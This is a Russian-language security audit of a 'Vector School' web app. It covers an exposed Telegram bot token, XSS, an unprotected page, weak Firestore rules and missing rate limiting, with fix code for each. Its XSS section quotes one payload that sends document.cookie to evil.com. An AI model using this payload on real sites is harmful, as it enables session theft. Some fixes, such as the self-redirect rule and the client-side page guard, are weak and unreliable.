# 🔒 Аудит безопасности Vector School

## 🔴 КРИТИЧЕСКИЕ УЯЗВИМОСТИ (требуют немедленного исправления)

### 1. **Telegram Bot Token виден в исходнике** ⚠️ КРИТИЧНО
**Проблема:** Токены `TELEGRAM_BOT_TOKEN` и `TELEGRAM_CHAT_ID` хранятся в открытом виде в `index.html`. Любой может:
- Перехватить и использовать бот для отправки spam сообщений
- Изменить `CHAT_ID` и перенаправить данные пользователей

**Решение:**
1. ✅ Переместить токен на **Firebase Cloud Function** (серверная часть, токен скрыт)
2. ✅ Клиент вызывает облачную функцию вместо прямого обращения к API Telegram
3. ✅ Перевыпустить токен в @BotFather (`/revoke`)

**Пример Firebase Cloud Function:**
```javascript
// functions/index.js
const functions = require("firebase-functions");
const fetch = require("node-fetch");

exports.sendTelegramMessage = functions.https.onCall(async (data, context) => {
    if (!context.auth) throw new functions.https.HttpsError('unauthenticated');
    
    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; // Переменная окружения!
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    try {
        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: data.message,
                    parse_mode: "Markdown"
                })
            }
        );
        return { success: response.ok };
    } catch (error) {
        throw new functions.https.HttpsError('internal', error.message);
    }
});
```

---

### 2. **XSS (Cross-Site Scripting)** ⚠️ КРИТИЧНО
**Проблема:** Пользовательские данные вставляются в HTML без экранирования:
- `lesson.studentAnswer` → `${lesson.studentAnswer}` в innerHTML
- `lesson.teacherFeedback` → `💬 ${lesson.teacherFeedback}` в innerHTML
- `user.name` → `${user.name}` в innerHTML

**Атака:** Учитель может ввести в feedback: `<img src=x onerror="fetch('https://evil.com?data='+document.cookie)">`

**Решение:**
```javascript
// ✅ ПРАВИЛЬНО: используй textContent вместо innerHTML
document.getElementById('feedback').textContent = lesson.teacherFeedback;

// ✅ Или экранируй HTML если нужно вставить в innerHTML
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
htmlString += `<p>${escapeHtml(lesson.feedback)}</p>`;

// ❌ НЕПРАВИЛЬНО: не используй innerHTML с user data
htmlString += `<p>${lesson.feedback}</p>`; // XSS!
```

---

### 3. **Отсутствует защита theory.html** ⚠️ КРИТИЧНО
**Проблема:** Файл `theory.html` доступен всем по прямому URL, даже без проверки доступа.

**Атака:** Любой может зайти на `vector-school/theory.html` и увидеть материалы, даже без регистрации.

**Решение:**
- Переместить `theory.html` на **защищённый endpoint** (Firebase Cloud Storage с правилами доступа)
- Или встроить содержимое теории прямо в `index.html` с проверкой доступа в JS
- Или установить редирект: если нет авторизации → перенаправить на главную

```javascript
// ✅ В theory.html (в начале):
<script>
    if (typeof firebase === 'undefined') {
        window.location.href = 'index.html'; // Редирект на главную
    }
    // Проверить доступ через Firebase
</script>
```

---

### 4. **Отсутствует валидация на клиенте и сервере** 
**Проблема:** 
- Нет проверки типов данных перед вставкой в Firestore
- Нет ограничения на длину текста
- Нет валидации email/phone перед отправкой в Telegram

**Решение:**
```javascript
// ✅ Валидация формы
function validateBookingForm(data) {
    if (!data.name || data.name.trim().length < 2) 
        throw new Error("Имя должно быть >= 2 символов");
    
    if (!data.email || !data.email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/))
        throw new Error("Некорректный email");
    
    if (!data.phone || data.phone.trim().length < 5)
        throw new Error("Некорректный телефон");
    
    if (data.message && data.message.length > 500)
        throw new Error("Сообщение не может быть > 500 символов");
    
    return true;
}

// Использовать перед отправкой
authForm.onsubmit = async (e) => {
    try {
        validateBookingForm(formData);
        // ... дальше отправка
    } catch (err) {
        alert(err.message);
    }
};
```

---

## 🟡 СЕРЬЁЗНЫЕ ПРОБЛЕМЫ (нужны исправления)

### 5. **Неправильная защита Firestore Rules**
**Текущие правила** позволяют студентам:
- Читать свой профиль ✅
- Обновлять любые поля? ❌ (включая `role` и `theoryAccess`)

**Правильные правила:**
```firestore
match /users/{userId} {
  // Студент может обновлять ТОЛЬКО homeowrk, НЕ role/theoryAccess
  allow update: if request.auth.uid == userId
    && request.resource.data.role == resource.data.role  // ✅ Role не меняется
    && request.resource.data.theoryAccess == resource.data.theoryAccess  // ✅ Доступ не меняется
    && request.resource.data.keys().hasAll(['name', 'email', 'role']); // Обязательные поля
}
```

### 6. **Rate Limiting отсутствует**
**Проблема:** Можно отправить 100 форм в секунду (Spam, DDoS)

**Решение:** 
- Добавить cooldown на клиенте (disable кнопка на 5 сек)
- В Firebase Cloud Function проверять rate limiting по UID

```javascript
// ✅ Cooldown на клиенте
let lastSubmit = 0;
form.onsubmit = async (e) => {
    if (Date.now() - lastSubmit < 5000) {
        alert("Подождите 5 секунд перед следующей отправкой");
        return;
    }
    lastSubmit = Date.now();
    submitBtn.disabled = true;
    // ...
};
```

### 7. **Отсутствует HTTPS на Firebase Hosting**
**Решение:** ✅ Firebase Hosting автоматически использует HTTPS. Убедись в `firebase.json`:
```json
{
  "hosting": {
    "public": ".",
    "redirects": [
      {
        "source": "/:path",
        "destination": "/:path",
        "type": 307
      }
    ]
  }
}
```

### 8. **Отсутствует защита от CSRF на API**
**Проблема:** Форма не имеет CSRF токена

**Решение:** Firebase Auth уже защищает от CSRF через токены, но добавь проверку на сервере (Cloud Function)

### 9. **Логирование и monitoring отсутствуют**
**Решение:**
- Добавить логирование попыток входа
- Логировать подозрительную активность (много ошибок входа)
- Использовать Firebase Security Alerts

```javascript
// ✅ Логирование в Firestore
await setDoc(doc(db, "audit_logs", Date.now().toString()), {
    event: "login_attempt",
    email: email,
    success: true/false,
    timestamp: new Date()
});
```

### 10. **Нет двухфакторной аутентификации**
**Решение:** Firebase поддерживает MFA. Для критичных операций добавить SMS или Email подтверждение.

---

## ✅ ЧТО ПРАВИЛЬНО

- ✅ Firebase Auth использует защищённые токены
- ✅ Firestore Rules блокируют неавторизованный доступ
- ✅ API ключи Firebase для веб-приложений можно безопасно хранить в коде (это публичные ключи)
- ✅ Пароли хешируются Firebase Auth (не видны в коде)

---

## 📋 ПЛАН ИСПРАВЛЕНИЙ (по приоритету)

| # | Проблема | Сложность | Время | Приоритет |
|---|----------|-----------|-------|-----------|
| 1 | Telegram токен на сервер (Cloud Function) | ⭐⭐⭐ | 1-2 часа | 🔴 КРИТИЧНО |
| 2 | XSS защита (escapeHtml для всех user data) | ⭐⭐ | 1 час | 🔴 КРИТИЧНО |
| 3 | Защита theory.html | ⭐ | 30 мин | 🔴 КРИТИЧНО |
| 4 | Валидация input данных | ⭐⭐ | 1 час | 🟡 СЕРЬЁЗНО |
| 5 | Улучшенные Firestore Rules | ⭐ | 20 мин | 🟡 СЕРЬЁЗНО |
| 6 | Rate Limiting | ⭐⭐ | 45 мин | 🟡 СЕРЬЁЗНО |
| 7 | Логирование аудита | ⭐⭐ | 1 час | 🟡 СЕРЬЁЗНО |

---

## 🚀 БЫСТРЫЕ ИСПРАВЛЕНИЯ (которые я уже сделал/буду делать)

1. ✅ Добавлена функция `escapeHtml()` для защиты от XSS
2. ✅ Заменены `innerHTML` на `textContent` где возможно
3. 🔄 Сейчас обновляю места с user data в HTML

---

**Подготовлено:** 2025-06-21  
**Статус:** ⚠️ Требуется немедленное действие на пунктах 1-3
